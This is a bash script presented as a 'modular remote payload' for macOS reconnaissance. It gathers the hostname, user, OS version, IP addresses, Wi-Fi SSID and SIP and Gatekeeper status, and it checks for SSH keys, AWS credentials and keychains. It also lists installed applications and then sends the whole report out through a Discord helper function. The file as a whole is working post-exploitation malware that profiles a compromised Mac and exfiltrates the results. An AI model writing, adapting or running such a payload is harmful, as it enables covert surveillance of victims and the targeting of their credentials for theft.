#!/bin/bash
# ============================================================
# Full Reconnaissance for macOS - Modular Remote Payload
# ============================================================

SYSID=$(get_sysid)
OUTPUT="🔍 **FULL RECON - $SYSID** (macOS)\n"
OUTPUT+="📅 $(date '+%Y-%m-%d %H:%M:%S')\n"
OUTPUT+="========================================\n\n"

# System
OUTPUT+="**🍎 SYSTEM**\n"
OUTPUT+="• Hostname: \`$(hostname)\`\n"
OUTPUT+="• User: \`$(whoami)\`\n"
OUTPUT+="• macOS: \`$(sw_vers -productVersion)\`\n"
OUTPUT+="• Build: \`$(sw_vers -buildVersion)\`\n"
OUTPUT+="• Model: \`$(sysctl -n hw.model)\`\n\n"

# Network
OUTPUT+="**🌐 NETWORK**\n"
OUTPUT+="• Local: \`$(ipconfig getifaddr en0 2>/dev/null)\`\n"
OUTPUT+="• Public: \`$(curl -s https://api.ipify.org)\`\n"
OUTPUT+="• WiFi: \`$(/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I 2>/dev/null | awk '/ SSID/ {print $2}')\`\n\n"

# Security
OUTPUT+="**🛡️ SECURITY**\n"
OUTPUT+="• SIP: \`$(/usr/bin/csrutil status 2>/dev/null | grep -o "enabled\|disabled")\`\n"
OUTPUT+="• Gatekeeper: \`$(spctl --status 2>/dev/null)\`\n\n"

# Interesting files
OUTPUT+="**📁 INTERESTING**\n"
[[ -d "$HOME/.ssh" ]] && OUTPUT+="• SSH Keys: ✅\n"
[[ -f "$HOME/.aws/credentials" ]] && OUTPUT+="• AWS Creds: ✅\n"
[[ -d "$HOME/Library/Keychains" ]] && OUTPUT+="• Keychains: ✅\n"

# Installed apps (top 10)
OUTPUT+="\n**📦 APPLICATIONS (sample):**\n"
ls /Applications 2>/dev/null | head -10 | while read app; do
    OUTPUT+="• $app\n"
done

# Homebrew
if command -v brew &>/dev/null; then
    OUTPUT+="\n**🍺 HOMEBREW:**\n"
    OUTPUT+="• Packages: \`$(brew list | wc -l | xargs)\`\n"
fi

send_discord "$OUTPUT"

